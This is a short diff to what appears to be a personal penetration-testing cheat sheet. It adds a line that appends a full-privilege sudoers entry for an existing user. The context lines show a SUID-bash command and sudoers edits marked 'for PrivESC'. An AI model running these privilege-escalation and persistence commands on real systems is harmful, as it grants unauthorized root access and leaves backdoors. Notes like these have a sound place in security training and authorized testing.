@@ -100,6 +100,7 @@ chmod +s /bin/bash
 > 1. john ALL=(root) /usr/bin/python3 /home/john/file.py #Orignal Command
 > 1. john ALL=(ALL:ALL) ALL #Modified for PrivESC
 > 1. make sure /etc/sudoers is has correct permsissions by running ```sudo chmod 0555 /etc/sudoers```
+> 1. echo <existing_user_present> ALL=(ALL) ALL >> sudoers
 
 
 #### Pivoting crap - MSF, socks4a and proxychains
